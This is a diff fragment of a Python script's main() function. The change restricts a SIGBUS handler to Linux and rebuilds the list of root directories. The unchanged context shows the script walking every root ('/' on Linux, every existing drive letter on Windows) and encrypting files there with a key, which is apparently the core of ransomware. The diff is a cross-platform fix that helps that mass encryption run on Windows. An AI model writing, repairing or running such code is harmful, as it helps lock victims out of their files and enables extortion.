@@ -139,14 +139,18 @@ def main():
     
     logging.debug(f"Exclude paths: {exclude_paths}")
     
-    signal.signal(signal.SIGBUS, handle_bus_error)
-    root_dirs = ["/"] if platform.system() == "Linux" else [f"{chr(drive)}:\\" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:\\")]
+    if platform.system() == "Linux":
+        signal.signal(signal.SIGBUS, handle_bus_error)
+        root_dirs = ["/"]
+    else:
+        root_dirs = [f"{chr(drive)}:\\" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:\\")]
     
     for root_dir in root_dirs:
         encrypt_files_with_resource_checks(root_dir, key, exclude_paths)
 
 if __name__ == "__main__":
     main()
+
 
 
 
